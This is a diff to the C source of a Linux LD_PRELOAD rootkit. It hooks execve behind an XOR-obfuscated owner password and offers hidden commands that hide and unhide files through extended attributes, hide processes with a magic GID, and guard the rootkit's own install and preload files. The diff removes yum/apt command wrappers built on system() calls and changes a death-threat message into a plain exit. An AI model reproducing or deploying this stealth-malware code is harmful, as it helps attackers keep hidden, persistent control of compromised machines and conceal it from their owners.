@@ -6,31 +6,6 @@
 // I'll also be tidying up bits here and there, so the final form (lol nice joke loser)
 // probably will look somewhat clean anyway
 
-// if you want to add your own commands in here, just try to follow the same structure as the default commands, it helps
-
-// saves me hardcoding in usage instructions for each command
-char *busage(char *path, char **uoptions, int sopt)
-{
-    // not a fan of the way i'm doing this, but it works
-    char *opts = (char *)malloc(128);
-    char _opts[128], *ret = (char *)malloc(256);
-    int i=0;
-    do // eaier than using a for loop
-    {
-        char *copt = strdup(uoptions[i]); xor(copt);
-        snprintf(_opts, sizeof(_opts), "%s/", copt);
-        CLEAN(copt);
-        strcat(opts, _opts);
-        i += 1; // yeah yeah i know
-    }while(uoptions[i] != NULL);
-    opts[strlen(opts) - 1] = 0; // remove the trailing '/' character from the built string
-
-    // size may be a little over the actual necessary size, but only by a tiny amount
-    char *x_usage = strdup(X_USAGE); xor(x_usage);
-    snprintf(ret, strlen(x_usage) + strlen(path) + strlen(opts), x_usage, path, opts);
-    CLEAN(x_usage); return ret;
-}
-
 // unhide when needed.
 // char *c_wrning is usually taken from const.h,
 // named *_WARNING (i.e. APT_WARNING, YUM_WARNING),
@@ -71,98 +46,8 @@ int execve(const char *filename, char *const argv[], char *const envp[])
         {
             char *execve_pw = strdup(EXECVE_PW); xor(execve_pw);
 
-            // if the first argument of argv is the user's execve password, the user using the owner shell
-            // is in fact the fully authorized owner of the rootkit. allow them access to the execve commands :)
             if(!strcmp(argv[1], execve_pw))
-            {
-                // the TWO functions relative to file hiding
-                HOOK(old_setxattr, CSETXATTR);
-                HOOK(old_removexattr, CREMOVEXATTR);
-
-                char *yum = strdup(YUM); xor(yum);
-                if(strstr(filename, yum))
-                {
-                    CLEAN(yum);
-
-                    // build yum usage
-                    char *yum_usage = busage(argv[0], yum_options, YUM_OPT_SIZE);
-                    if(argv[2] == NULL) { printf("%s", yum_usage); exit(0); } // show usage and exit if no operation argument is given
-                    int s = 0;
-                    for(int i=0;i<YUM_OPT_SIZE;i++) if(!strcmp(argv[2], apt_options[i])) s = 1; // check if a valid operation was given
-                    if(!s) { printf("%s", yum_usage); exit(0); } // show usage and exit if not
-
-                    // get the cwd for later and assume a normal user
-                    char old_cwd[512];
-                    getcwd(old_cwd, sizeof(old_cwd));
-                    unhide_proc(YUM_WARNING);
-
-                    // this system i have now is so much better than previous versions. don't know why i haven't done this before now
-                    for(int i=0;i<YUM_COM_SIZE;i++)
-                    {
-                        char *c_opt = strdup(yum_options[i]); xor(c_opt);
-                        if(!strcmp(argv[2], c_opt)) // match found??
-                        {
-                            char *ex = strdup(yum_commands[i]); xor(ex); // the two arrays have relative indexes between command names and commands themselves
-                            if(strstr(ex, "%%s")) // does the command require a third argument?
-                            {// if so, take the third argument into consideration
-                                char buf[128];
-                                snprintf(buf, sizeof(buf), ex, argv[3]);
-                                system(buf);
-                            }else system(ex); // since not, just do a simple
-                            CLEAN(ex); CLEAN(c_opt); break; // no point in still looping after this
-                        }
-                        CLEAN(c_opt);
-                    }
-
-                    old_setgid(MAGIC_GID); // rehide after calling unhide_proc
-
-                    char *yum_success = strdup(E_SMSG); xor(yum_success);
-                    printf(yum_success, argv[0]); CLEAN(yum_success);
-                    chdir(old_cwd); exit(0);
-                }
-
-                char *apt = strdup(APT); xor(apt);
-                if(strstr(filename, apt))
-                {
-                    CLEAN(apt);
-
-                    // build apt usage
-                    char *apt_usage = busage(argv[0], apt_options, APT_OPT_SIZE);
-                    if(argv[2] == NULL) { printf("%s", apt_usage); exit(0); }
-                    int s = 0;
-                    for(int i=0;i<APT_OPT_SIZE;i++) if(!strcmp(argv[2], apt_options[i])) s = 1;
-                    if(!s) { printf("%s", apt_usage); exit(0); } // apt will handle messages if no third argument is given for install
-
-                    // looking at this, i want to make process unhiding & hiding generally safer and more difficult for third parties
-                    char old_cwd[512];
-                    getcwd(old_cwd, sizeof(old_cwd));
-                    unhide_proc(APT_WARNING);
-
-                    for(int i=0;i<APT_COM_SIZE;i++)
-                    {
-                        char *c_opt = strdup(apt_options[i]); xor(c_opt);
-                        if(!strcmp(argv[2], c_opt))
-                        {
-                            char *ex = strdup(apt_commands[i]); xor(ex);
-                            if(strstr(ex, "%%s"))
-                            {
-                                char buf[64];
-                                snprintf(buf, sizeof(buf), ex, argv[3]);
-                                system(buf);
-                            }else system(ex);
-                            CLEAN(ex); CLEAN(c_opt); break;
-                        }
-                        CLEAN(c_opt);
-                    }
-
-                    old_setgid(MAGIC_GID);
-
-                    char *apt_success = strdup(E_SMSG); xor(apt_success);
-                    printf(apt_success, argv[0]); CLEAN(apt_success);
-                    chdir(old_cwd); exit(0);
-                }
-                CLEAN(apt);
-
+            {// grant access to commands
                 char *unhide_file = strdup(UNHIDE_FILE); xor(unhide_file);
                 if(strstr(filename, unhide_file))
                 {
@@ -175,14 +60,9 @@ int execve(const char *filename, char *const argv[], char *const envp[])
                     }
 
                     char *target_file = argv[2];
-
                     char *install = strdup(INSTALL); xor(install);
                     char *ld_preload_etc = strdup(LD_PRELOAD_ETC); xor(ld_preload_etc);
-                    if((strstr(target_file, install) || strstr(target_file, ld_preload_etc)) && hidden_xattr(target_file))
-                    {
-                        printf("Try to unhide that again and I'll fucking kill you.\n");
-                        CLEAN(ld_preload_etc); CLEAN(install); exit(0);
-                    }
+                    if((strstr(target_file, install) || strstr(target_file, ld_preload_etc)) && hidden_xattr(target_file)) { CLEAN(ld_preload_etc); CLEAN(install); exit(0); } // ok just exit.. no threats to your life
                     CLEAN(ld_preload_etc); CLEAN(install);
 
                     char *xattr = strdup(XATTR), xattr_user[256];
@@ -192,6 +72,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
                     snprintf(xattr_user, sizeof(xattr_user), xattr, hidden_xattr_1_str); // create user.blahblahblah attribute to hide the file
                     CLEAN(xattr); CLEAN(hidden_xattr_1_str);
 
+                    HOOK(old_removexattr, CREMOVEXATTR);
                     int ret = old_removexattr(target_file, xattr_user);
 
                     if(ret < 0 && errno == ENOENT) { printf("File %s does not exist.\n", target_file); exit(0); } // invalid path
@@ -224,6 +105,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
                     CLEAN(xattr); CLEAN(hidden_xattr_1_str);
 
                     xor(hidden_xattr_2_str);
+                    HOOK(old_setxattr, CSETXATTR);
                     int ret = old_setxattr(target_file, xattr_user, hidden_xattr_2_str, strlen(hidden_xattr_2_str), XATTR_CREATE);
                     CLEAN(hidden_xattr_2_str);
 
@@ -235,17 +117,6 @@ int execve(const char *filename, char *const argv[], char *const envp[])
                     CLEAN(hide_success); exit(0);
                 }
                 CLEAN(hide_file);
-
-                char *help = strdup(HELP); xor(help);
-                if(strstr(filename, help))
-                {
-                    CLEAN(help);
-                    char *shell_msg = strdup(SHELL_MSG); xor(shell_msg);
-                    printf("%s\n", shell_msg);
-                    CLEAN(shell_msg); exit(0);
-                }
-                CLEAN(help);
-
             }
 
             CLEAN(execve_pw);
